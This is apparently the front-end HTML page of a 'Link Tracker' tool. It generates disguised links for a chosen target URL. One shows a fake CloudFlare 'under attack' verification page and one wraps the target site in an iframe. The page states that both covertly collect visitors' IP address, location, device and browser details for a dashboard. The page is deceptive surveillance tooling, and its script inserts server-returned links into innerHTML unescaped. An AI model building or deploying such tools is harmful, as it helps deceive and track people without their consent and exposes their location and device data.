<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Tracker - Create Tracking Links</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <h1>üîó Link Tracker</h1>
            <p class="subtitle">Create tracking links to gather information</p>
        </header>

        <div class="card">
            <div class="card-header">
                <h2>Create New Tracking Link</h2>
            </div>
            <div class="card-body">
                <form id="createLinkForm">
                    <div class="form-group">
                        <label for="userId">Your User ID (for tracking)</label>
                        <input 
                            type="text" 
                            id="userId" 
                            placeholder="Enter a unique identifier (e.g., user123)"
                            required
                        >
                    </div>

                    <div class="form-group">
                        <label for="targetUrl">Target URL</label>
                        <input 
                            type="url" 
                            id="targetUrl" 
                            placeholder="https://example.com"
                            required
                        >
                        <small>Enter the URL where users will be redirected after data collection</small>
                    </div>

                    <button type="submit" class="btn btn-primary">
                        Generate Tracking Links
                    </button>
                </form>

                <div id="result" class="result hidden">
                    <h3>‚úÖ Links Created Successfully!</h3>
                    
                    <div class="link-section">
                        <h4>üåê CloudFlare Page Link</h4>
                        <p class="description">Shows a CloudFlare under attack page before redirect</p>
                        <div class="link-box">
                            <input type="text" id="cloudflareLink" readonly>
                            <button class="btn-copy" onclick="copyToClipboard('cloudflareLink')">Copy</button>
                        </div>
                        <div id="cloudflareShort" class="short-links hidden"></div>
                    </div>

                    <div class="link-section">
                        <h4>üåê WebView Page Link</h4>
                        <p class="description">Shows the target website in an iframe</p>
                        <div class="link-box">
                            <input type="text" id="webviewLink" readonly>
                            <button class="btn-copy" onclick="copyToClipboard('webviewLink')">Copy</button>
                        </div>
                        <div id="webviewShort" class="short-links hidden"></div>
                    </div>

                    <div class="dashboard-link">
                        <a id="dashboardLink" class="btn btn-secondary" target="_blank">
                            üìä View Dashboard
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <div class="info-card">
            <h3>‚ÑπÔ∏è How It Works</h3>
            <ul>
                <li><strong>CloudFlare Link:</strong> Displays a CloudFlare verification page to collect information before redirecting</li>
                <li><strong>WebView Link:</strong> Shows the target website in an iframe while collecting data in the background</li>
                <li><strong>Data Collected:</strong> IP address, location, device info, browser details, and more</li>
                <li><strong>Dashboard:</strong> View all collected data from your tracking links</li>
            </ul>
        </div>

        <footer class="footer">
            <p>‚ö†Ô∏è Use responsibly and ethically. Ensure compliance with privacy laws.</p>
        </footer>
    </div>

    <script>
        const form = document.getElementById('createLinkForm');
        const result = document.getElementById('result');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const userId = document.getElementById('userId').value;
            const targetUrl = document.getElementById('targetUrl').value;
            
            const btn = form.querySelector('button');
            btn.disabled = true;
            btn.textContent = 'Generating...';
            
            try {
                const response = await fetch('/api/create-link', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ url: targetUrl, userId: userId })
                });
                
                const data = await response.json();
                
                if (response.ok) {
                    document.getElementById('cloudflareLink').value = data.cloudflareLink;
                    document.getElementById('webviewLink').value = data.webviewLink;
                    document.getElementById('dashboardLink').href = `/dashboard/${userId}`;
                    
                    // Show shortened links if available
                    if (data.cloudflareShortLinks) {
                        const cloudflareShort = document.getElementById('cloudflareShort');
                        cloudflareShort.innerHTML = '<h5>Shortened Links:</h5>' + 
                            data.cloudflareShortLinks.map(link => 
                                `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
                            ).join('');
                        cloudflareShort.classList.remove('hidden');
                    }
                    
                    if (data.webviewShortLinks) {
                        const webviewShort = document.getElementById('webviewShort');
                        webviewShort.innerHTML = '<h5>Shortened Links:</h5>' + 
                            data.webviewShortLinks.map(link => 
                                `<div class="short-link"><a href="${link}" target="_blank">${link}</a></div>`
                            ).join('');
                        webviewShort.classList.remove('hidden');
                    }
                    
                    result.classList.remove('hidden');
                    result.scrollIntoView({ behavior: 'smooth' });
                } else {
                    alert(data.error || 'Error creating links');
                }
            } catch (error) {
                alert('Error: ' + error.message);
            } finally {
                btn.disabled = false;
                btn.textContent = 'Generate Tracking Links';
            }
        });

        function copyToClipboard(elementId) {
            const input = document.getElementById(elementId);
            input.select();
            document.execCommand('copy');
            
            const btn = event.target;
            const originalText = btn.textContent;
            btn.textContent = 'Copied!';
            setTimeout(() => {
                btn.textContent = originalText;
            }, 2000);
        }
    </script>
</body>
</html>
